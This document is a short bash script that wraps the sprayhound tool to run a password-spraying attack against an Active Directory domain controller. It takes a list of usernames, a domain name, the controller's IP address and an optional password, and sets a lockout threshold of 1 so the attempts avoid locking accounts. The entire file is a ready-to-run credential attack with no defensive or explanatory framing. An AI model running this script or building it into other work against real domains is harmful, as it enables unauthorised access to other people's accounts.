#!/bin/bash

# Function to display the usage of the script
usage() {
    echo "Syntax: $0 'usernamefile' 'domain name' 'DC IP address' [password]"
    echo "Example: $0 users.list mydomain.local 10.10.10.10 'Password123!'"
    echo "Note: If the password contains special characters, remember to escape them or enclose them in single quotes."
    echo "Password is optional, but if used, the lockout threshold is set to 1 (to prevent account lockouts)."
    echo ""
    exit 1
}

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit
fi

# Check if at least three arguments are supplied
if [ $# -lt 3 ]; then
    echo "Error: Too few arguments supplied."
    usage
fi

# Assign variables to arguments for better readability
usernamefile=$1
domainname=$2
dcip=$3
password=${4:-} # If the password is not provided, default to empty string

# Call sprayhound with the provided arguments and the lockout threshold
if [ -z "$password" ]; then
    echo "No password supplied, running sprayhound without a password..."
    sprayhound -U "$usernamefile" -d "$domainname" -dc "$dcip" --threshold 1
else
    echo "Running sprayhound with supplied password..."
    sprayhound -U "$usernamefile" -d "$domainname" -dc "$dcip" -p "$password" --threshold 1
fi
